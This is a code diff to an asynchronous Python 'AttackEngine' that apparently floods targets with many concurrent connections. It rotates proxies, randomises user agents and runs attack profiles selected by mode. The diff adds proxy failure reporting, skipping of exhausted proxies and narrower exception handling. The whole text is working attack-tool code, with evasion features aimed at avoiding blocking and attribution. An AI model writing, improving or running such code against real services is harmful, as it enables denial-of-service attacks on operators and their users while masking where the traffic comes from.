@@ -23,7 +23,15 @@ class AttackEngine:
         self.config = config
         self.stop = stop
         self.stats = Stats()
-        self._pool = ProxyPool(config.proxies, config.rotate_proxies) if config.proxies else None
+        self._pool = (
+            ProxyPool(
+                config.proxies,
+                config.rotate_proxies,
+                max_failures=config.proxy_max_failures,
+            )
+            if config.proxies
+            else None
+        )
 
     async def run(self) -> None:
         workers = [asyncio.create_task(self._worker(i)) for i in range(self.config.concurrency)]
@@ -32,7 +40,7 @@ class AttackEngine:
             if self.config.duration > 0:
                 try:
                     await asyncio.wait_for(self.stop.wait(), timeout=self.config.duration)
-                except asyncio.TimeoutError:
+                except TimeoutError:
                     pass  # time's up
             else:
                 await self.stop.wait()
@@ -54,6 +62,9 @@ class AttackEngine:
         last_fail = 0.0
         while not self.stop.is_set():
             proxy = self._pool.next() if self._pool else None
+            if self._pool is not None and proxy is None:
+                await asyncio.sleep(1.0)
+                continue
             ua = random.choice(config.user_agents) if config.user_agents else "Mozilla/5.0"
             writer = None
             try:
@@ -65,13 +76,17 @@ class AttackEngine:
                 self.stats.peak_active = max(self.stats.peak_active, self.stats.active)
                 last_fail = 0.0
 
-                await PROFILES[config.mode]().run(
-                    reader, writer, config, ua, self.stats, self.stop
-                )
+                await PROFILES[config.mode]().run(reader, writer, config, ua, self.stats, self.stop)
                 self.stats.completed += 1
             except asyncio.CancelledError:
                 raise
-            except (ConnectionError, OSError, ssl.SSLError, asyncio.TimeoutError) as exc:
+            except (TimeoutError, ConnectionError, OSError, ssl.SSLError) as exc:
+                # Only report failures that are likely proxy-related
+                if proxy is not None and self._pool is not None:
+                    # Connection errors before establishing connection are often proxy issues
+                    # Timeout errors could be proxy or target
+                    if isinstance(exc, (ConnectionError, OSError)):
+                        self._pool.report_failure(proxy)
                 self.stats.errors += 1
                 if config.verbose:
                     print(f"  [w{idx}] {type(exc).__name__}: {exc}", flush=True)
@@ -84,7 +99,7 @@ class AttackEngine:
                     try:
                         writer.close()
                         await writer.wait_closed()
-                    except Exception:
+                    except OSError:
                         pass
                     self.stats.active = max(0, self.stats.active - 1)
 
